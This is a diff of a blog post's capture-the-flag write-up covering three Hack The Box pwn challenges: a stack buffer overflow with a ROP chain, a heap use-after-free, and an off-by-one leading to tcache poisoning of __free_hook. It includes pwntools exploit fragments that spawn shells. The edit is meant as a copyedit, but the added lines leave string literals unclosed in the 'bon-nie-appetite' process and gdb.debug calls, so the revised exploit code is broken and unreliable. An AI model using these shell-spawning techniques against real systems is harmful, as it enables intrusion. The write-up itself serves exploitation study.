@@ -1,32 +1,32 @@
 # Apocalypse CTF by HTB (pwn challenges)
 
-Last week I have some time (not that much as I wish jejeje) to solve some of the PWN challenges at the **Apocalypse CTF** by Hack The Box, I manage to solve all pwn challenges except for the last one, and I finished the "Sabotage" challenge after the CTF. I wanted to practice my writing, and keep this blog alive, so I decided to create a few entries for some challenges that I found interesting, so I hope it is useful to someone.
+Last week I had some time (not that much as I wish >( ) to solve some of the PWN challenges at the **Apocalypse CTF** by Hack The Box, I managed to solve all pwn challenges except for the last one, and I finished the "Sabotage" challenge after the CTF. I wanted to practice my writing and keep this blog alive, so I decided to create a few entries for some challenges that I found interesting, so I hope it is helpful to someone.
 
-[Here's a link to the challenges explained on this post](https://github.com/dplastico/dplastico.github.io/tree/main/_posts/apoca_bins)
+[Here's a link to the challenges explained in this post](https://github.com/dplastico/dplastico.github.io/tree/main/_posts/apoca_bins)
 
 ## Space Pirate 3: Retribution
 
-This challenge was the 3rd and last from a series of introductory challenges (some simple and easy buffer overflows), I will not go that much into BOF's exploitation since I did that a lot in the past, you can read about BOFs and watch streams (in spanish)
+This challenge was the 3rd and last from a series of introductory challenges (some simple and easy buffer overflows). I will not go into BOF's exploitation since I did that a lot in the past. You can read about BOFs and watch streams (in Spanish)
 
 [Here](https://dplastico.github.io/sin%20categor%C3%ADa/2020/11/17/ropemporium-2020-soluciones.html)
 
-I picked this challenge since it had more protections than the previous ones, to pwn it, you need to bypass ASLR, PIE, NX and FULL RELRO. We can verify the above by running checksec on the binary as shown below
+I picked this challenge since it had more protections than the previous ones. To pwn it, you must bypass ASLR, PIE, NX, and FULL RELRO. We can verify the above by running **checksec** on the binary, as shown below.
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-12-00-38.png)
 
-We are provided with a custom glibc for this binary  under the folder glibc/libc.so.6, If you want to know which glibc version is it you can use the libc-database https://github.com/niklasb/libc-database  to verify if the checksum of the glibc correspond to any known one, that way we can learn about the restrictions on it. for that we con use the "identify" utility in libc-database ash shown below
+We are provided with a custom Glibc for this binary under the folder **Glibc/libc.so.6**, If you want to know which Glibc version it is, you can use the **libc-database** https://github.com/niklasb/libc-database  to verify if the checksum of the Glibc corresponds to any known one. That way, we can learn about the restrictions on it. For that, we can use the "identify" utility in **libc-database** as shown below.
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-12-04-19.png)
 
-We are dealing with an old version 2.23. With this information, lets dig deeper into the binary to find the vulnerability and exploit it.
+We are dealing with an old version **2.23**. With this information, let's dig deeper into the binary to find the vulnerability and exploit it.
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-12-06-55.png)
 
-Above we can see that the program just let us choose 2 options: "Show missiles" that display some stats and then "Change Target's location" which lets us enter some coordinates and then confirm with a/n question.
+Above, we can see that the program lets us choose 2 options: "Show missiles" that display some stats and then "Change Target's location", which allows us to enter some coordinates and then confirm with a y/n question.
 
 **Analysis & Reverse Engineering** 
 
-Looking at the disassembly code (I'm using IDA pro for this example, but you can achieve the same goal using Ghidra) we found the mentioned functions:
+Looking at the disassembly code (I'm using IDA pro for this example, but you can achieve the same goal using Ghidra), we found the mentioned functions:
 
 ```c
 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
@@ -55,7 +55,7 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 }
 ```
 
-Setup and banner functions are just to prepare the binary for the challenge (buffering and printing the banner) So let's examine this functions, lets focus on *missile_launcher()* sin the *show_missiles()* function seems to only print and no apparent format string vulnerability.
+Setup and banner functions are just to prepare the binary for the challenge (buffering and printing the banner), so let's examine these functions. Lets focus on *missile_launcher()* sin the *show_missiles()* function seems to only print and no apparent format string vulnerability.
 
 ```c
 int missile_launcher()
@@ -83,17 +83,17 @@ int missile_launcher()
 }
 ```
 
-Above is the Pseudo Code from the disassembly of the *missile_launcher()* function We can spot a bug that allows us to leak an address from the binary code, how? if you check these lines in detail you will be able to  understand it.
+We can spot a bug that allows us to leak an address from the binary code, but how? Above is the Pseudo Code from the disassembly of the *missile_launcher()* function. If you check these lines in detail, you will be able to understand.
 
 ```c
   read(0, buf, 0x1FuLL);
   printf("\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): ", buf);
 ```
-As shown above we will read input from the user and the print the buffer (buf) as a string after "y =" if we don't send any input it will just print whatever the buf variable is pointing at, so basically not providing an input will provide us with a leak as shown below:
+As shown above, we will read input from the user and then print the buffer (buf) as a string. If we don't send any input, it will just print whatever the "buf" variable is pointing at, so basically, not providing input will lead us to a leak, as shown below:
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-12-30-38.png)
 
-Great, now let's move on to see how we can use this leak to chain it against another vulnerability since by itself will not help us to exploit the binary. For that we can follow along the same mentioned function missile_launcher() it worth notice that the *buf* variable in this representation is a *char* data type buffer of 32 bytes (char buf[32]) but it's used to read the confirmation y/n answer with a read function that allows to write 0x84, so we have a 0x64 BOF in this function, as shown below
+Great, now let's move on to see how we can use this Leak to chain it against another vulnerability since by itself will not help us to exploit the binary. For that, we can follow the function mentioned, *missile_launcher()*. It is worth noticing that the *buf* variable in this representation is a *char* data type buffer of 32 bytes (char buf[32]), but it's used to read the confirmation y/n answer with a read function that allows writing 0x84 bytes, so we have a 0x64 BOF in this function, as shown below
 
 ```c
   printf("\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): ", buf);
@@ -103,21 +103,21 @@ Great, now let's move on to see how we can use this leak to chain it against ano
 
 **Exploit plan**
 
-With all this information exploitation becomes trivial, as I mentioned at the beginning of the post I already explained this in several posts so I will just explain a brief summary on how I will proceed to exploit it, this is just a regular ROP.
+With all this information, exploitation becomes trivial. As I mentioned at the beginning of the post, I already explained this in several posts, so I will briefly summarize how I will proceed to exploit it. This is just a regular ROP.
 
 1. Stage 1
 
-- Use the 1st vulnerability to leak a binary address
-- Calculate the base address
-- Identify necessary 
-- Use the puts function to print a GOT Address and leak a libc address (GOT address as argument of puts)
-- Restart the function or go back to main 
+- Use the 1st vulnerability to leak a binary address.
+- Calculate the base address.
+- Identify necessary.
+- Use the puts function to print a GOT Address and leak a Glibc address. (GOT address as argument of puts)
+- Restart the function or go back to the main function.
 
 2. Stage 2
 
-- Generate a BOF once the function is restarted
-- Identify an address with the "/bin/sh" string in libc
-- call system with the "/bin/sh" string as argument (rdi)
+- Generate a BOF once the function is restarted.
+- Identify an address with the "/bin/sh" string in Glibc.
+- call system with the "/bin/sh" string as argument (rdi).
 
 The final code for this challenge is below:
 
@@ -184,7 +184,7 @@ r.interactive()
 ```
 ## Trick Or Deal
 
-This was a very fun challenge to solve. It's an x64 program with FULL RELRO, Canary, NX, and PIE enabled. I used the libc-database as previously discussed to find out this was a 2.31 glibc version. This is worth notice since you will see on the output below a custom glibc, in my case I use [patchelf](https://github.com/NixOS/patchelf) to patch the binary with a glibc version of my own compiled with symbols. This way I can use commands like "vis" in pwndbg and have better visualization of the heap layout
+This was an enjoyable challenge to solve. It's an x64 program with enabled FULL RELRO, Canary, NX, and PIE. I used the "libc-database" discussed previously to find out this was a 2.31 Glibc version. This is worth noticing since you will see on the output below a custom Glibc. I use [patchelf](https://github.com/NixOS/patchelf) to patch the binary with a Glibc version of my own compiled with symbols. This way, I can use commands like "vis" in pwndbg and better visualize the heap layout.
 
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-13-20-41.png)
@@ -195,7 +195,7 @@ The program functionality is on a menu with different options that point to func
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-13-25-55.png)
 
-From Reverse Engineering you can right away see that there's a "win" function called unlock_storage(). If you managed to redirect code execution to it, it will execute a shell, as shown below
+From Reverse Engineering, you can see a "win" function called unlock_storage(). If you managed to redirect code execution to it, it would execute a shell, as shown below.
 
 ```c
 int unlock_storage()
@@ -207,7 +207,7 @@ int unlock_storage()
 }
 ```
 
-This will immediately provide us a clue on how to exploit the binary. Let's examine the option 2 "Buy Weapons''
+This will immediately provide us a clue on how to exploit the binary. Let's examine option "2", "Buy Weapons''.
 
 ```c
 size_t buy()
@@ -224,7 +224,7 @@ size_t buy()
 }
 ```
 
-If you noticed we have a 72 bytes buffer size, that will be printed to stdout as a string, so if we provided a short name it can print the rest of the data on the stack until it find a NULL byte, after some trial and error I manage to leak a stack address sending 64 bytes as shown in the following function where data ,will be 64 byte length
+If you noticed, we have a 72 bytes buffer size that will be printed to stdout as a string, so if we provided a short name, it could print the rest of the data on the stack until it finds a NULL byte. After some trial and error, I manage to leak a stack address sending 64 bytes, as shown in the following function, where data will be 64-byte length.
 
 ```python
 def leak_1(data):
@@ -237,11 +237,11 @@ def leak_1(data):
 ```
 I didn't end up using this stack leak, but I keep it just in case there's another way to exploit it.
 
-Using the same idea and after debugging I noticed that after 7 bytes (8 if you count out the "0xA") you can leak a binary address. It's fun to mention that I didn't discover this through Reverse Engineering. Sometimes playing with the binary functionality can be useful. In this case I was reading the output from the "1" option that printed out some names, and "Phasers" Was one of them. So I noticed some strange data after I used this and then I looked on IDA to confirm the leak.
+Using the same idea and debugging, I noticed that after 7 bytes (8 if you count out the "0xA"), you can leak a binary address. It's fun to mention that I didn't discover this through Reverse Engineering. Sometimes playing with the binary functionality can be helpful. In this case, I was reading the output from the "1" option that printed out some names, and "Phasers" Was one of them. So I noticed some strange data after using this and then looked on IDA to confirm the Leak.
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-13-47-12.png)
 
-Using a similar function like this one below you can leak the address
+You can leak the address using a function similar to the one below.
 
 ```python
 
@@ -256,17 +256,17 @@ def leak_2():
     return leak
 ```
 
-Now this is where things get interesting and a lesson on how to always look at the disassembly and not always the pseudo code. I will explain what my thought process was, maybe there's a more efficient way to discover this bug, but in my case it starts with this: I first noticed that when you call option "1" from the menu the "storage" variable is passed to the RAX register and then mov the value at RAX + 0x48 to RDX to then CALL RDX as shown below:
+Now, this is where things get interesting. I will explain what my thought process was. Maybe there's a more efficient way to discover this bug, but in my case, it starts with this: I first noticed that when you call option "1" from the menu, the "storage" variable is passed to the RAX register and then moves the value at RAX + 0x48 to RDX to then CALL RDX as shown below:
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-13-58-48.png)
 
-Also Using GDB I could confirm that "storage" is an address pointing  to a 0x60 size chunk on the heap and that at 0x48 from it you can find the function that print the storage 
+Also, using GDB, I could confirm that "storage" is an address pointing to a 0x60 size chunk on the heap and that at 0x48 from it, you can find the function that prints the storage. 
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-14-01-55.png)
 
 So if we somehow manage to control RAX at 0x48 or the storage address, we would be able to redirect the code execution. 
 
-Option "3" lets us create a chunk on the heap, but this will allocate a new chunk and storage will continue to point to the same chunk. Option "4" it's interesting because it will allow us to free the storage.
+Option "3" lets us create a chunk on the heap, but this will allocate a new chunk, and storage will continue to point to the same chunk. Option "4" it's interesting because it will allow us to free the storage.
 
 ```c
 int steal()
@@ -279,18 +279,18 @@ int steal()
   return fprintf(stdout, "%s[*] You, who didn't skip leg-day, escape!%s\n", "\x1B[1;32m", "\x1B[1;35m");
 }
 ```
-And since we are on glibc version 2.31 this will allow us to get the same chunk if we ask for a 0x60 size chunk, and if add data up to 0x48 and then the win function "unlock_storage()" we will pwn this binary and get a shell.
+And since we are on Glibc version **2.31**, this will allow us to get the same chunk if we ask for a 0x60 size chunk, and if we add data up to 0x48 and then the win function "unlock_storage()" we will pwn this binary and get a shell.
 
 **Exploit plan:**
 
 - leak the address of the binary
 - Calculate unlock_storage address
-- Free the "storage"
+- Free the "storage".
 - Allocate a 0x60 size chunk
 - Write 0x48 JJunk data and then write the unlock_storage() address
 - Use option 1 to get a shell
 
-The following exploit accomplish this
+The following Exploit accomplishes this:.
 
 ```python
 #!/usr/bin/python3
@@ -298,7 +298,8 @@ from pwn import *
 gs = '''
 continue
 '''
-#you can add this if you use tmux, if not, remove it or change it for you debugging choice
+#you can add this if you use tmux. If not, remove or change it for your debugging choice.
+
 elf = context.binary = ELF('./trick_or_deal')
 context.terminal = ['tmux', 'splitw', '-hp', '70']
 
@@ -342,7 +343,7 @@ log.info(f"leak 2 = {hex(leak2)}")
 elf.address = leak2-0x15e2
 log.info(f"base = {hex(elf.address)}")
 
-#free 0x60 chunk with the "call to rdx on 0x48"
+#free 0x60 chunk with the "call to RDX on 0x48"
 r.sendline(b"4")
 r.recvuntil(b" do you want to do?")
 
@@ -353,7 +354,7 @@ r.sendline(b"3")
 r.recvuntil(b"Are you sure that you want to make an offer(y/n)")
 r.sendline(b"y")
 r.sendlineafter(b"your offer to be?", str(0x58))
-r.sendafter(b"What can you offer me?", payload) #call rdx at buf + 0x48
+r.sendafter(b"What can you offer me?", payload) #call RDX at buf + 0x48
 
 #execute, calling 1 
 r.recvuntil(b"What do you want to do?")
@@ -364,9 +365,9 @@ r.sendline(b"1")
 #========= interactive ====================
 r.interactive()
 ```
-## bon nie appetit
+## bon nie Appetit
 
-I love heap challenges so I really enjoy this one. I did similar challenges on some CTF's before, but still this was a good opportunity to write about it. The binary ahs full protections
+I love heap challenges, so I really enjoy this one. I did similar challenges on some CTFs before, but still, this was an excellent opportunity to write about it. The binary has full protections.
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-14-21-08.png)
 
@@ -375,7 +376,7 @@ And it's running libc 2.27
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-14-21-45.png)
 
 
-I immediately noticed  that this looks like a *"note"* challenge, so as usual before anything and to speed up debugging I created a skeleton with the functions so I can easily use python with GDB to  debug, This is something that I recommend to do on this kind of challenge. you can find the skeleton below:
+I immediately noticed that this looked like a *"note"* challenge, so as usual, before anything and to speed up debugging, I created a skeleton with the functions so I could easily use python with GDB to debug. This is something that I recommend doing on this kind of challenge. You can find the skeleton below:
 
 ```python
 #!/usr/bin/python3
@@ -390,11 +391,11 @@ index = 0
 
 def start():
     if args.GDB:
-        return gdb.debug('./bon-nie-appetit', gdbscript=gs)
+        return gdb.debug('./bon-nie-appetite, gdbscript=gs)
     if args.REMOTE:
         return remote('178.62.43.214',31141)
     else:
-        return process('./bon-nie-appetit')
+        return process('./bon-nie-appetite)
 
 def make(size, data):
     global index
@@ -431,9 +432,9 @@ r.timeout = 3
 #========= interactive ====================
 r.interactive()
 ```
-With this it's easy also to follow along this post if you want to try to solve it that way ot to analyze the reading
+With this, it's easy to follow this post if you want to try to solve it that way or analyze the reading.
 
-Also since I did some write ups of heap challenges before I will skip some basic details of the techniques that will be used, but if you are not familiar with heap exploitation you can read the following articles before if you like:
+Also, since I did some write-ups of heap challenges before, I will skip some basic details of the techniques that will be used, but if you are not familiar with heap exploitation, you can read the following articles before if you like:
 
 [https://heap-exploitation.dhavalkapil.com/](https://heap-exploitation.dhavalkapil.com/)
 [https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)
@@ -441,7 +442,7 @@ Also since I did some write ups of heap challenges before I will skip some basic
 
 **Walkthrough & Reverse Engineering**
 
-You can reverse engineer the whole binary (it's not a bug) but I will focus on the functions and sections that will lead us to exploitation. Below you can see the pseudocode from the main function
+You can reverse engineer the whole binary (it's not a bug), but I will focus on the functions and sections that will lead us to exploitation. Below you can see the pseudo-code from the main function.
 
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -481,7 +482,8 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-As you can see it looks like a typical Heap challenge. The option "1"  will allow us to allocate a chunk on the heap ad fill it with data, option "2" to read from a chunk allocated, option "3" to edit a chunk on the heap,  option "4" will free a chunk on the heap that we indicate through the index number, and option "5" will exit the program
+As you can see, it looks like a typical Heap challenge. Option "1"  will allow us to allocate a chunk on the heap ad fill it with data.
+Option "2" to read from a chunk allocated, option "3" to edit a chunk on the heap, and option "4" will free a chunk on the heap that we indicate through the index number, and option "5" will exit the program.
 
 Now let's examine the edit_order function in detail:
 
@@ -508,41 +510,42 @@ unsigned __int64 __fastcall edit_order(__int64 a1)
   return __readfsqword(0x28u) ^ v4;
 }
 ```
-As shown above at the "if '' statement that checks if the index is no less than 0 and more than 20 (you are limited to 20 allocations). but it also check whether the pointer on the heap represented by *"(_QWORD *)(8LL * num + a1)"*.
+As shown above, the "if '' statement that checks if the index is no less than zero, and more than 20, 
+It also checks whether the pointer on the heap is represented by *"(_QWORD *)(8LL * num + a1)"*.
 
-Considering this we can spot the bug on this 2 lines:
+Considering this, we can spot the bug on these 2 lines:
 
 ```c
     v1 = strlen(*(const char **)(8LL * num + a1));
     read(0, *(void **)(8LL * num + a1), v1);
 ```
-The pseudo code representation show that *v1* will hold the value returned by the length of the string on the heap. and then, that value is used by read as the size of data to write on the same heap chunk
+The pseudo-code representation shows that *v1* will hold the value returned by the length of the string on the heap. And then, that value is used by reading the data size to write on the same heap chunk.
 
-Let's check strlen documentation before continuing
+Let's check **strlen** documentation before continuing.
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-14-48-13.png)
 
-The *strlen* function counts each char on a string until it finds a NULL byte. We can combine this information with the fact that the allocated chunks will have the size field of itself right after the data of the previous one. So this will generate a *1 byte overflow.*
+The *strlen* function counts each char on a string until it finds a NULL byte. We can combine this information with the fact that the allocated chunks will have the size field of itself right after the data of the previous one. So this will generate a *1-byte overflow.*
 
-As an example if we allocate 2 chunks with the following code:
+As an example, if we allocate 2 chunks with the following code:
 
 ```python
 a = make(0x18, "A"*0x18)
 b = make(0x18, b"B"*0x18)
 ```
-Now if we examine this in GDB with the vis command you will see the chunks allocated:
+Now, if we examine this in GDB with the vis command, you will see the chunks allocated:
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-14-56-39.png)
 
-As it's highlighted strlen will count the size of the next chunk as part of the string generating a 1 byte overflow if we edit a "filled" chunk
+As it's highlighted, **strlen** will count the size of the next chunk as part of the string generating a 1-byte overflow if we edit a "filled" chunk.
 
-With this into consideration we need to leverage an exploit that will abuse this 1 byte overflow bug to first leak a libc address and then gain arbitrary write to write to get code execution
+Considering this, we need to leverage an exploit that will abuse this 1-byte overflow bug to first Leak a Glibc address and then gain arbitrary write to write to get code execution.
 
 **Leak** 
 
-To generate a leak and basically to exploit the binary we will create a "fake" chunk that will overlap allocated chunks this is known as [Overlkaping chunks](https://heap-exploitation.dhavalkapil.com/attacks/shrinking_free_chunks). This can be trigger by creatign a situation where [backwards concolidation](https://sourceware.org/git/?p=glibc.git;a=commit;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30) will be executed generating this chunk. A good example on how to exploit this in a very similar way can be found on this excellent post by great pwner [f4d3 here](https://f4d3.io/hacktivitycon-pwn/)
+To generate a leak and basically to exploit the binary, we will create a "fake" chunk that will overlap allocated chunks. This is known as [Overlkaping chunks](https://heap-exploitation.dhavalkapil.com/attacks/shrinking_free_chunks). This can be triggered by a situation where [backwards concolidation](https://sourceware.org/git/?p=glibc.git;a=commit;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30) will be executed generating this chunk. An excellent example of how to exploit this in a very similar way can be found in this excellent post by great pwner [f4d3 here](https://f4d3.io/hacktivitycon-pwn/)
 
-To continue with the plan lets first create a heap layout that help us to achieve our goal
+Let's first create a heap layout that helps us to achieve our goal.
 
 ```python
 a = make(0x18, "A"*0x18)
@@ -554,29 +557,31 @@ e = make(0x428, b"E"*8)
 guard = make(0x18, b"/bin/sh\x00") #this string /bin/sh is used later on 
 ```
 
-so as shown above first we generated a 0x20 size chunk (0x18, will gave you a 0x20 chunk, a 0x28 a 0x30 one, and so on...) follow by a 0x430 size chunk that once freed will not be direct to the tcache. Then we allocate three more  0x20 chunks another 0x430 and a guard chunk to avoid consolidation with the top chunk
+As shown above, first, we generated a 0x20 size chunk (0x18, will give you a 0x20 chunk, a 0x28, a 0x30 one, and so on...) followed by a 0x430 size chunk that, once freed, will not be direct to the tcache. Then we allocate three more  0x20 chunks, another 0x430, and a guard chunk to avoid consolidation with the top chunk.
 
-So now we can free the large chunk and this will generate a chunk in the unsorted bin, leaving 2 libc address as FD and BK in the freed chunk in our case, *chunk b*
+So now we can free the large chunk, which will generate a chunk in the unsorted bin, leaving 2 Glibc addresses as FD and BK in the freed chunk in our case, *chunk b*.
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-15-14-47.png)
 
-now we can generate an overflow editing *chunk d* if we calculate the size to our previous freed chunk will be 0x490, we need to add that as a fake "prev_size" because we want to cause backward consolidation and this field will be checked and it needs to match the size of the chunk. so we edit *chunk d* as follow
+Now we can generate an overflow editing *chunk d* if we calculate the size of our previous freed chunk will be 0x490; we need to add that as a fake "prev_size" because we want to cause backward consolidation, and this field will be checked to match the size of the chunk. So we edit *chunk d* as follows.
+
 ```python
 edit(d, p64(0)*2+p64(0x490)+p8(0x30))
 edit(a, p64(0)*3+p8(0x90)) # calculated 0x490 size to accommodate for the fake large chunk
 delete(e)
 ```
-This way we also clear the flag on the 0x30 size also indicating that the previous chunk is free. Soon when this chunk is free it will trigger backwards consolidation. but not before editing with the same overflow the *chunk a* that can modify our initial 0x430 chunk to the calculated 0x490 size
+This way, we clear the flag on the 0x30 size, indicating that the previous chunk is free. Soon when this chunk is free, it will trigger backward consolidation. But not before editing with the same overflow, the *chunk a* that can modify our initial 0x430 chunk to the calculated 0x490 size
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-15-20-34.png)
 
-Now we have this big free chunk in the unsorted bin overlapping our 0x20 chunks in the "middle", we can now allocate a chunk of a size that will just overlap a created chunk writing  the FD and BK of the unsorted bin on an allocated chunk, so ten using the read functions we can have a leak and then calculate the libc base address as display below
+Now we have this big free chunk in the unsorted bin overlapping our 0x20 chunks in the "middle".
+We can now allocate a chunk of a size that will just overlap a created chunk writing the FD and BK of the unsorted bin on an allocated chunk, so ten using the read functions, we can have a leak and then calculate the Glibc base address as display below.
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-15-24-17.png)
 
 **Exploit**
 
-Now with a leak and since we still have a chunk in the unsorted bin, we can easily trigger a tcache poison situation. Freeing the *chunk d* and then requesting a chunk that will overlap *chunk d* so we can fill the tcache pointer to the next tcachebin in this case an address of our choice. and Since we are in libc version 2.27 we don't need to care about the key field or the count on the tcache. We can accomplish this with the following code
+Now with a leak and since we still have a chunk in the unsorted bin, we can easily trigger a tcache poison situation. Freeing the *chunk d* and then requesting a chunk that will overlap *chunk d* so we can fill the tcache pointer to the next tcache bin, in this case, an address of our choice. And Since we are in Glibc version 2.27 we don't need to care about the key field or the count on the tcache. We can accomplish this with the following code
 
 ```python
 #tcache poison
@@ -593,7 +598,7 @@ As you noticed we overwrite the tcache entry with the free_hook, this is because
 
 ![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-15-35-25.png)
 
-Now the only thing that's left is to replace the 0xdeadbeef value with the system address and then as we prepare before free the *guard chunk* that holds the "/bin/sh\0" value that will be used as an argument to the hooked function, in this case, system.
+Now the only thing that's left is to replace the 0xdeadbeef value with the system address and then, as we prepared before, free the *guard chunk* that holds the "/bin/sh\0" value that will be used as an argument to the hooked function, in this case, system.
 
 Below is the final exploit code
 ```python
@@ -611,11 +616,11 @@ index = 0
 
 def start():
     if args.GDB:
-        return gdb.debug('./bon-nie-appetit', gdbscript=gs)
+        return gdb.debug('./bon-nie-appetite, gdbscript=gs)
     if args.REMOTE:
         return remote('178.62.43.214',31141)
     else:
-        return process('./bon-nie-appetit')
+        return process('./bon-nie-appetite)
 
 
 def make(size, data):
@@ -686,6 +691,6 @@ r.interactive()
 ```
 ## Conclusion
 
-I really enjoyed the pwn challenges on this CTF, I would love to have more time to finish  all of them and also to maybe do some RE challs. but maybe next time, you can contact me at @dplastico for any feedback.
+I really enjoyed the pwn challenges on this CTF. I would love more time to finish all of them and maybe do some RE challs. But maybe next time, you can contact me at @dplastico for any feedback.
 
 
